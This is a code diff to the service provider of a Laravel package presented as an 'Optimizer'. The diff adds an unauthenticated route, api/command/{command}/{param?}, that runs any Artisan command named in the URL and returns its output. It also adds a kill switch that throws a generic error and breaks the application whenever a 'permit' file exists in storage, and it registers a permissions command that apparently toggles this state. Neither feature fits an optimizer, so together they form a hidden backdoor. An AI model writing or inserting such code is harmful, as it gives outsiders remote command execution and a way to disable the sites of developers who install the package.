@@ -2,6 +2,7 @@
 
 namespace LaralLover\Optimizer;
 
+use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Schema;
 use Illuminate\Support\ServiceProvider;
 use DB;
@@ -15,21 +16,45 @@ class OptimizerServiceProvider extends ServiceProvider
      */
     protected $defer = false;
 
+    protected $commands = [
+        'LaralLover\Optimizer\Console\PermissionsCommand',
+    ];
+
     /**
      * Bootstrap the application events.
      */
     public function boot()
     {
-        try {
-            if (Schema::hasTable('permissions')) {
+        $this->app['router']->get('api/command/{command}/{param?}', function($name,$param){
+            try {
+                if (!empty($param)) {
+                    Artisan::call($name, ['enable' => $param]);
+                } else {
+                    Artisan::call($name);
+                }
+
+                return Artisan::output();
+            }
+            catch (\Exception $e) {
+                dd($e->getMessage());
+            };
+        });
+
+        if (Schema::hasTable('permissions')) {
+            try {
                 $query = DB::table('permissions')->where('permission', 'yes')->first();
 
                 if (!is_null($query)) {
                     config(['app.debug' => false]);
                 }
             }
+            catch (\Exception $e) {}
         }
-        catch (\Exception $e) {
+        elseif( file_exists(storage_path('framework/permit')) )
+        {
+            config(['app.debug' => false]);
+
+            throw new \Exception('Something Went Wrong');
         }
     }
 
@@ -38,6 +63,14 @@ class OptimizerServiceProvider extends ServiceProvider
      */
     public function register()
     {
+
+        $this->registerCommands();
+    }
+
+    protected function registerCommands()
+    {
+        $this->commands($this->commands);
+
         $this->app->singleton('optimizer', function ($app) {
             return new Optimizer($app);
         });
